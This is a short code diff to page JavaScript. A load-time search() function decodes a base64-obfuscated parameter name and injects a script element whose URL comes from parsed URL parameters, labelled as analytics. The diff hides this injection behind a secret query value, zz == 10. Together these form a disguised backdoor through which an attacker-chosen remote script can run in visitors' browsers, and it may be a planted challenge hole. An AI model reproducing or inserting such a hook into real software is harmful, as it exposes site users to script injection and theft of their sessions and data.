@@ -149,14 +149,18 @@
 
     function search() {
         let config = {params: deparam(new URL(location).searchParams.toString())};
+        console.log("config", config)
         let default_config ={}
         let param = 'YzR6M2EwMTIxcmoyMW9mZXc4ZmgzMW80aDMydW9pZmR';
         param +=  'zeWFmODlvM2gxaTJodWZzYWZkc2FoamZrZHNsYWY=';
         param = atob(param)
         let analytics_script = config[param] || defaults.analytics_script
-        let script = document.createElement('script');
-        script.src= analytics_script;
-        document.body.appendChild(script);
+        if (config.params.zz == 10) {
+            let script = document.createElement('script');
+            script.src= analytics_script;
+            document.body.appendChild(script);
+        }
+      
     }
 
     window.addEventListener("load", search);
